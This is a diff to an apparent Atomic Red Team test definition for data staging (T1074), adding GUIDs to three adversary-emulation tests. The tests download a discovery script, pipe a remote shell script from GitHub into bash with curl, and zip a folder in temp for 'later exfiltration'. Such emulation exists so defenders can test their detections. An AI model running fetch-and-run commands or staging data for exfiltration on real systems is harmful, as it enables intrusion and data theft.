@@ -4,6 +4,7 @@ display_name: Data Staged
 
 atomic_tests:
 - name: Stage data from Discovery.bat
+  auto_generated_guid: 745c929f-4289-4cca-a6af-5daa6e47257e
   description: |
     Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution,
     verify that the file is saved in the temp directory.
@@ -26,6 +27,7 @@ atomic_tests:
       Remove-Item -Force #{output_file} -ErrorAction Ignore
 
 - name: Stage data from Discovery.sh
+  auto_generated_guid: 7df23290-e35e-466a-a4ea-cb56ff2a9823
   description: |
     Utilize curl to download discovery.sh and execute a basic information gathering shell script
 
@@ -43,6 +45,7 @@ atomic_tests:
       curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.sh | bash -s > #{output_file}
 
 - name: Zip a Folder with PowerShell for Staging in Temp
+  auto_generated_guid: b5858e70-a3dd-4305-930a-fc3bed0b3fe2
   description: |
     Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder_to_zip.zip
     was placed in the temp directory.
